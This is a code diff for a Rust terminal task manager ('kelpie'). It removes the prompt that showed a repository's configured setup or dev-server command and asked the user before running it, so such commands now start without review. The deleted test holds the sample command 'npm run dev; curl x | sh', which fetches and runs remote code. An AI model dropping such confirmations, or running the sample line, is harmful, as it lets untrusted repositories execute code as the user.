@@ -173,16 +173,10 @@ enum Mode {
     ConfirmDrop { path: PathBuf, name: String, force: bool },
     ConfirmReset { path: PathBuf, name: String },
     ConfirmPush { path: PathBuf, commits: Vec<tasks::Commit>, selected: usize, card: Option<(report::Card, bool)> },
-    ConfirmCommand { repo: PathBuf, command: String, what: &'static str, then: Box<Then> },
     EditMessage(Box<MessageEditor>),
     Working { label: String, result: Receiver<Result<String>> },
     Questions(Box<QuestionWindow>),
     Help,
-}
-
-enum Then {
-    Toggle(Box<Item>, Process),
-    Start { repo: PathBuf, name: String, prompt: Option<String>, backlog: Option<String> },
 }
 
 #[derive(Clone, Copy, PartialEq, Debug)]
@@ -630,7 +624,7 @@ fn spawn_update_checker() -> (Receiver<Vec<(String, String)>>, Sender<()>) {
         loop {
             let places = update_check::Places::current();
             let notice = crate::lead::state_dir().map(|state| {
-                update_check::notice(&update_check::current(&state, messages::now(), update_check::installed(&places), || update_check::check(&places)))
+                update_check::notice(&update_check::current(&state, messages::now(), places.channel, update_check::installed(&places), || update_check::check(&places)), crate::release::read_override(&state).as_ref())
             }).unwrap_or_default();
             if notice_tx.send(notice).is_err() {
                 return;
@@ -1126,21 +1120,6 @@ impl App {
             Mode::Help | Mode::Message(_) => {}
             working @ Mode::Working { .. } => self.mode = working,
             Mode::Questions(window) => self.handle_questions(window, key),
-            Mode::ConfirmCommand { repo, command, then, .. } => {
-                let yes = key.code == KeyCode::Char('y');
-                if yes && let Err(error) = config::confirm_command(&repo, &command) {
-                    self.show(Err(error));
-                    return;
-                }
-                match *then {
-                    Then::Toggle(item, process) if yes => self.toggle(&item, process),
-                    Then::Toggle(..) => {}
-                    Then::Start { repo, name, prompt, backlog } => {
-                        let result = start_in_background(&repo, &name, prompt.as_deref(), backlog.as_deref());
-                        self.show(result.map(|started| if yes { started } else { format!("{started} Its Claude is not told the repo's setup command.") }));
-                    }
-                }
-            }
             Mode::ConfirmReset { path, .. } => {
                 if key.code == KeyCode::Char('y') {
                     self.in_background("Resetting the task…".to_string(), move || tasks::reset(&path, None));
@@ -1486,14 +1465,6 @@ impl App {
         }
     }
 
-    fn start_confirmed(&mut self, repo: PathBuf, name: String, prompt: Option<String>, backlog: Option<String>) {
-        let setup = config::resolve(Some(&repo)).ok().and_then(|loaded| config::unconfirmed(&loaded.settings.setup_command, &repo));
-        match setup {
-            Some(command) => self.mode = Mode::ConfirmCommand { repo: repo.clone(), command, what: "worktree.setup_command", then: Box::new(Then::Start { repo, name, prompt, backlog }) },
-            None => self.show(start_in_background(&repo, &name, prompt.as_deref(), backlog.as_deref())),
-        }
-    }
-
     // Each process runs in a tab of the Space named after it; stopping it is ctrl-c to that tab.
     fn toggle(&mut self, item: &Item, process: Process) {
         let (Some(workspace), Some(path)) = (&item.workspace, &item.path) else {
@@ -1508,10 +1479,6 @@ impl App {
         let tab = process.tab(settings.as_ref());
         let tab = tab.as_str();
         let busy = busy_tab_pane(workspace, tab);
-        if busy.is_none() && let (Some(repo), Some(settings)) = (&item.repo, &settings) && let Some(command) = config::unconfirmed(process.setting(settings), repo) {
-            self.mode = Mode::ConfirmCommand { repo: repo.clone(), command, what: process.key(), then: Box::new(Then::Toggle(Box::new(item.clone()), process)) };
-            return;
-        }
         let result = match busy {
             Some(pane) => herdr::send_keys(&pane, &["ctrl+c"]).map(|_| format!("Stopping {} in {}.", process.noun(), item.name)),
             None => {
@@ -1575,13 +1542,13 @@ impl App {
             Purpose::TaskPrompt(name) => {
                 let repo = self.any_repo();
                 let prompt = (!text.is_empty()).then_some(text);
-                self.start_confirmed(repo, name, prompt, None);
+                self.show(start_in_background(&repo, &name, prompt.as_deref(), None));
             }
             Purpose::BacklogName(entry) => {
                 let prompt = backlog::task_prompt(&entry, &self.sources, crate::vault_cli::known_on());
                 let known = self.repo_named(&entry.area);
                 match known.map_or_else(|| outside(terminal, || repo::locate(&entry.area)), Ok) {
-                    Ok(repo) => self.start_confirmed(repo, text, Some(prompt), Some(entry.reference.clone())),
+                    Ok(repo) => self.show(start_in_background(&repo, &text, Some(&prompt), Some(&entry.reference))),
                     Err(error) => self.show(Err(error)),
                 }
             }
@@ -2836,19 +2803,6 @@ fn draw(frame: &mut Frame, app: &mut App) {
             lines.push(Line::from(Span::styled("any key to close", style(MUTED))));
             modal(frame, "kelpie".to_string(), lines, 96);
         }
-        Mode::ConfirmCommand { repo, command, what, then } => {
-            let answer = match then.as_ref() {
-                Then::Toggle(..) => "Run it?  y / n",
-                Then::Start { .. } => "Tell the task to run it?  y / n (n starts the task without it)",
-            };
-            modal(frame, "confirm".to_string(), vec![
-                Line::from(Span::styled(format!("{}'s {} sets {what} to", repo::name_of(repo), config::REPO_FILE), style(MUTED))),
-                Line::from(Span::styled(command.clone(), style(TEXT))),
-                Line::default(),
-                Line::from(Span::styled("It runs as you. kelpie asks again whenever the repo changes it.", style(MUTED))),
-                Line::from(Span::styled(answer, style(YELLOW))),
-            ], 96);
-        }
         Mode::ConfirmReset { name, .. } => {
             modal(frame, "reset".to_string(), vec![
                 Line::from(Span::styled(name.clone(), style(TEXT))),
@@ -3030,7 +2984,7 @@ impl App {
             messages: Vec::new(), fold: Fold::Line, seen: 0, fold_file: None, in_messages: false, message_back: 0, questions: Vec::new(), usage: None, ongoing: Vec::new(),
             details: HashMap::new(), detail_requests: None, detail_results: None, asked_details: HashMap::new(),
             graphics: Graphics::Off, images: HashMap::new(), decoded: HashMap::new(), image_requests: None, image_results: None, plans: HashMap::new(),
-            updates: Vec::new(), updater: std::sync::Arc::new(|| update::run(&crate::doctor::Env::current().claude_dir, false)), update_running: false, update_shown: false, recheck: None,
+            updates: Vec::new(), updater: std::sync::Arc::new(|| update::run(&crate::doctor::Env::current().claude_dir, false, &crate::release::Request::Channel)), update_running: false, update_shown: false, recheck: None,
         }
     }
 }
@@ -3449,18 +3403,6 @@ mod tests {
 
     fn find(rows: &[String], text: &str) -> Vec<(usize, usize)> {
         rows.iter().enumerate().filter_map(|(y, row)| row.find(text).map(|byte| (row[..byte].chars().count(), y))).collect()
-    }
-
-    #[test]
-    fn a_command_from_a_repos_own_file_is_shown_in_full_before_it_runs() {
-        let mut app = test_app(vec![served("search-filters")]);
-        let item = app.tasks[0].clone();
-        app.mode = Mode::ConfirmCommand { repo: PathBuf::from("/work/web"), command: "npm run dev; curl x | sh".to_string(), what: Process::Server.key(), then: Box::new(Then::Toggle(Box::new(item), Process::Server)) };
-        let screen = render(&mut app, 120, 30).0.join("\n");
-        assert!(screen.contains("web's .kelpie.toml sets worktree.dev_server to") && screen.contains("npm run dev; curl x | sh") && screen.contains("Run it?  y / n"), "{screen}");
-        app.mode = Mode::ConfirmCommand { repo: PathBuf::from("/work/web"), command: "/bin/sh -c x".to_string(), what: "worktree.setup_command", then: Box::new(Then::Start { repo: PathBuf::from("/work/web"), name: "x".to_string(), prompt: None, backlog: None }) };
-        let screen = render(&mut app, 120, 30).0.join("\n");
-        assert!(screen.contains("/bin/sh -c x") && screen.contains("n starts the task without it"), "{screen}");
     }
 
     #[test]
